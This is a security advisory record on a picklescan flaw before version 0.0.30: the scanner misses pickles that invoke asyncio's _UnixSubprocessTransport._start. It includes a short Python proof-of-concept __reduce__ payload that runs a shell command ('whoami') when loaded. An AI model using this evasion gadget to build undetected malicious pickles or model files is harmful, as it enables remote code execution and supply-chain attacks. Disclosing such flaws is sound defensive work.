advisory_id: GHSA-q77w-mwjj-7mqx
datasource_id: github_osv_importer_v2/GHSA-q77w-mwjj-7mqx
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-q77w-mwjj-7mqx/GHSA-q77w-mwjj-7mqx.json
aliases: []
summary: "Picklescan is missing detection when calling built-in python library asyncio.unix_events._UnixSubprocessTransport._start\n\
  ### Summary\n\nUsing asyncio.unix_events._UnixSubprocessTransport._start function, which is\
  \ a built-in python library function to execute remote pickle file.\n\n### Details\n\nThe\
  \ attack payload executes in the following steps:\n\nFirst, the attacker craft the payload\
  \ by calling to asyncio.unix_events._UnixSubprocessTransport._start function in reduce method\n\
  Then when the victim after checking whether the pickle file is safe by using Picklescan library\
  \ and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious\
  \ pickle file, thus lead to remote code execution.\n\n### PoC\n\n```\nfrom asyncio.unix_events\
  \ import _UnixSubprocessTransport\nfrom types import SimpleNamespace\n\nclass EvilAsyncioUnixSubprocessTransportStart:\n\
  \    def __reduce__(self):\n        fake_self = SimpleNamespace(\n            _loop=None,\n\
  \            _protocol=None,\n            _proc=None\n        )\n        args = \"whoami\"\
  \  \n        return _UnixSubprocessTransport._start, (\n            fake_self, args, True,\
  \ None, None, None, 0\n        )\n```\n\n### Impact\n\nWho is impacted? Any organization or\
  \ individual relying on picklescan to detect malicious pickle files inside PyTorch models.\n\
  What is the impact? Attackers can embed malicious code in pickle file that remains undetected\
  \ but executes when the pickle file is loaded.\nSupply Chain Attack: Attackers can distribute\
  \ infected pickle files across ML models, APIs, or saved Python objects.\n\n### Corresponding\n\
  \nhttps://github.com/FredericDT\nhttps://github.com/Qhaoduoyu"
impacted_packages:
  - purl: pkg:pypi/picklescan
    affected_versions: vers:pypi/<0.0.30
    fixed_versions: vers:pypi/0.0.30
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses: []
references:
  - url: https://github.com/mmaitre314/picklescan
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/commit/1931c2d04eaca8d20597705ff39cab78ba364e4b
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-q77w-mwjj-7mqx
    reference_type:
    reference_id:
